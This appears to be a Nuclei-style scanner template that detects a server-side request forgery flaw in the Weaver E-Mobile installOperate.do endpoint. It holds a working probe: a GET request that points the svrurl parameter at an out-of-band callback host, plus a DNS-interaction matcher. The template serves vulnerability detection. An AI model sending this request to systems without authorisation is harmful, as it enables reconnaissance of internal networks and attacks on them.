id: E-Mobile-installOperate-SSRF

info:
  name: 泛微E-Mobile系统接口installOperate.do存在SSRF漏洞
  author: wangzong
  severity: medium
  description: 泛微E-Mobile installOperate.do 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEE-Mobile%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3installOperate.do%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/install/installOperate.do?svrurl=http://{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"